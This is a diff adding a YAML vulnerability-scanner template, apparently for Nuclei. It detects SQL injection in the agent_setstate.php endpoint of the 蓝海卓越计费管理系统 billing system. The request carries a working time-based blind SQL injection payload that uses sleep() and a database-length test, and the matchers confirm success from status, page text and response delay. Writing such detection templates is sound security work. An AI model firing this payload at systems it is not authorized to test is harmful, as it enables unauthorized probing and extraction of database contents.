@@ -1,0 +1,33 @@
+id: poc-yaml-natshell-bms-agent-setstat-sqli
+info:
+  name: 蓝海卓越计费管理系统 agent_setstat SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in 蓝海卓越计费管理系统 agent_setstat endpoint.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1)+2}}"
+
+http:
+  - raw:
+      - |
+        GET /agent_setstate.php?id=1+AND+(SELECT+4964+FROM+(SELECT(if(length(database())=6,sleep({{t1}}),1)))uQqn) HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "设置代理账户状态"
+          - "设置代理账号状态失败"
+          - "location.href="
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
+          - duration < to_number(t2)
